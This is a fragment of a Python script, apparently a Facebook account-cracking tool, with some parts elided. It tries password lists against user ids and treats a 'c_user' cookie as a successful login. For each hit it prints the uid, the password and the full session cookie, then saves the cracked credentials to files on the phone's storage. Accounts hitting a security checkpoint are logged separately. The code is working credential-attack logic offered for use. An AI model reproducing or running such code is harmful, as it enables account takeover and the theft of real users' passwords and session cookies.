...
os.system('espeak -a 300 "welcomed to FMZ 999 free tools"')
logo =("""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[AXN-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 "CONGESTION YOU HAVE A OK IDS"')
                cek_apk(session,coki)
                open('/sdcard/AXN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[AXN-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AXN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
